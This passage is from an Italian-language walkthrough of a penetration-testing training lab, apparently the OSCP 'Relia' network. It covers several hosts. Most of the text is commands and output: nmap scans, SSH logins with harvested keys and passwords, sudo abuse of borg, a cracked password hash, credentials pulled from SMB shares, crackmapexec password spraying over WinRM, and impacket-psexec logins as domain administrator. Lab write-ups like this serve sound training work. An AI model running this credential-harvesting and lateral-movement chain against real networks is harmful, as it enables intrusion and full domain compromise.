Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Accedo tramite ssh con le credenziali trovate nella macchina 15:

```bash
ssh -i sarah_id_rsa sarah@172.16.156.19
```

Trovo così la flag local.txt

Lancio il comando:

```bash
sudo -l
```

E ottengo questo risultato:

```bash
Matching Defaults entries for sarah on backup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sarah may run the following commands on backup:
    (ALL) NOPASSWD: /usr/bin/borg list *
    (ALL) NOPASSWD: /usr/bin/borg extract *
    (ALL) NOPASSWD: /usr/bin/borg mount *
```

Dopo diverse ricerche scopro come poter utilizzare il comando per poter estrapolare delle informazioni dalla cartella /root.

In particolare è stato utile lanciare il comando:

```bash
./pspy64 -pf -i 1000
```

Che mi ha tirato fuori un'informazione importante, ovvero la passphrase di borg

```bash
/bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1716808218 /media/usb0 
```

Utilizzo questo comando:

```bash
sudo borg list /opt/borgbackup::home root/
```

E tiro fuori due informazioni utili:
- l'hash della password dell'utente amy (utente della macchina attuale)
- la password dell'utente andrew per accedere tramite ssh alla machhina 20

```bash
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
}
```

Decodifico la password tramite questo [sito](https://crackstation.net/)

```bash
amy:backups1
```

E cambio utente 

```bash
su amy
```

Scopro che amy ha privilegi elevati su sudo, così lancio il comando:

```bash
sudo su
```

Divento root e ottengo la flag proof.txt

## 172.16.X.20 {pwned:local&proof}

```bash
sudo nmap -sC -sV -O 172.16.156.20
```

```bash
Nmap scan report for 172.16.156.20 (172.16.156.20)
Host is up (0.027s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 33:4a:77:87:5b:88:f4:f1:f3:bb:75:7b:ec:9e:21:31 (RSA)
|_  256 c8:3a:f1:c9:e1:9c:31:2d:9d:26:df:c7:c5:21:d8:e3 (ECDSA)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

Una volta eseguito l'accesso con le credenziali trovate sulla macchina 19 tramite il comando:

```bash
ssh -i ssh andrew@172.16.165.20 
Rb9kNokjDsjYyH
```

Trovo sia la flag local.txt che la flag proof.txt

## 172.16.X.21 - FILES {pwned:proof}

```bash
sudo nmap -sC -sV -O 172.16.156.21
```

```bash
Nmap scan report for 172.16.156.21 (172.16.156.21)
Host is up (0.034s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: FILES, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:7d:93 (VMware)
|_clock-skew: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-26T14:41:10
|_  start_date: N/A
```

Accesso smb l'utente jim:

```bash
smbclient -N -L //172.16.156.21 -U relia.com/jim%Castello1\!
```

```bash
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        apps            Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        monitoring      Disk      
        scripts         Disk     
```

Analizzando i file trovo delle credenziali:

```bash
john.m:YouWillNeverTakeMyTractor!1922
administrator:vau!XCKjNQBv2$
```

IMPORTANTE: LA PASSWORD SCOPERTA QUI E' QUELLA DEL DOMAIN ADMIN CHE SERVE AD ACCEDERE (CON PERMESSI DA AMMINISTRATORE) A TANTISSIME MACCHINE PRESENTI SU QUESTO LAB:
- 6
- 7
- 21
- 30
- 189
- 191

Provo a verificare se queste credenziali possono essere utili ad accedere a qualche macchina:

La seconda coppia di credenziali serve per accedere in rdp alla macchina 14,15.

IMPORTANTE: IL GIORNO DOPO NON ANDAVA IN RDP ALLE MACCHINE 14 E 15 (già pwnate)

MA HO SCOPERTO ALTRO TRAMITE QUESTO COMANDO:

```bash
sudo crackmapexec winrm 172.16.165.0/24 -u domain_users.txt -p passwords.txt -d relia.com --continue-on-success | grep "[+]"
```

Quindi posso accedere tramite winrm alle macchine:

```bash
WINRM       172.16.165.21   5985   172.16.165.21    [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
WINRM       172.16.165.6    5985   172.16.165.6     [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
WINRM       172.16.165.5    5985   172.16.165.5     [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
WINRM       172.16.165.7    5985   172.16.165.7     [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
WINRM       172.16.165.30   5985   172.16.165.30    [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
```

Quindi utilizzo questo comando per accedere e collezionare tutte le flag presenti su questa macchina:

```bash
impacket-psexec relia.com/Administrator:"vau\!XCKjNQBv2$"@172.16.165.30
```

## 172.16.X.30 - WEBBY {pwned:proof}

```bash
sudo nmap -sC -sV -O 172.16.156.30
```

```bash
Nmap scan report for 172.16.156.30 (172.16.156.30)
Host is up (0.020s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Anna Test Machine
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WEBBY
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WEBBY.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-26T14:42:40+00:00
| ssl-cert: Subject: commonName=WEBBY.relia.com
| Not valid before: 2024-05-11T16:16:13
|_Not valid after:  2024-11-10T16:16:13
|_ssl-date: 2024-05-26T14:43:20+00:00; +4s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-26T14:42:40
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WEBBY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:4e:30 (VMware)
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
```

Accesso smb con jim e dmzadmin.

Visitando la pagina 80:

![](/OSCP/Immagini_OSCP/Relia/30_port_80.png)
Una volta trovate le credenziali del Domain Admin sulla macchina 21, utilizzo questo comando per accedere e collezionare tutte le flag presenti su questa macchina:

```bash
impacket-psexec relia.com/Administrator:"vau\!XCKjNQBv2$"@172.16.165.30
```
